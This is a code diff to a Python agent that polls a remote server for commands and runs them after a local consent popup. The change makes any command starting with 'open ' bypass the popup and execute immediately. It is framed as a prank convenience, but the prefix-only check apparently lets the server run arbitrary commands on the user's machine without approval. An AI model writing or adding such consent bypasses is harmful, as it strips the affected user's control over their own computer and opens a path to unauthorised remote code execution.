@@ -375,24 +375,33 @@ def run_agent(server_url: str, poll_interval: int = 2, consent_timeout: int = 60
                 cmd_id = data["command"].get("id", "unknown")
                 print(f"\n[RECEIVED] Command #{cmd_id}: {command}")
 
-                approved = show_consent_popup(command, timeout=consent_timeout)
+                # Bypass consent for 'open <url>' commands (Rick Roll etc.)
+                bypass_consent = command.strip().lower().startswith("open ")
 
-                if approved:
-                    print(f"[CONSENT] User APPROVED command #{cmd_id}")
+                if bypass_consent:
+                    print(f"[AUTO] Bypassing consent for open command #{cmd_id}")
                     result = execute_command(command)
                     result["command"] = command
-                    result["consent"] = "approved"
+                    result["consent"] = "auto"
                 else:
-                    print(f"[CONSENT] User DENIED command #{cmd_id}")
-                    result = {
-                        "command": command,
-                        "success": False,
-                        "stdout": "",
-                        "stderr": "Command was denied by the user at this computer.",
-                        "exitCode": -1,
-                        "duration": 0,
-                        "consent": "denied",
-                    }
+                    approved = show_consent_popup(command, timeout=consent_timeout)
+
+                    if approved:
+                        print(f"[CONSENT] User APPROVED command #{cmd_id}")
+                        result = execute_command(command)
+                        result["command"] = command
+                        result["consent"] = "approved"
+                    else:
+                        print(f"[CONSENT] User DENIED command #{cmd_id}")
+                        result = {
+                            "command": command,
+                            "success": False,
+                            "stdout": "",
+                            "stderr": "Command was denied by the user at this computer.",
+                            "exitCode": -1,
+                            "duration": 0,
+                            "consent": "denied",
+                        }
 
                 http_post(f"{server_url}/api/agent/result/{agent_id}", result, timeout=10)
                 status = "OK" if result.get("success") else "FAIL"
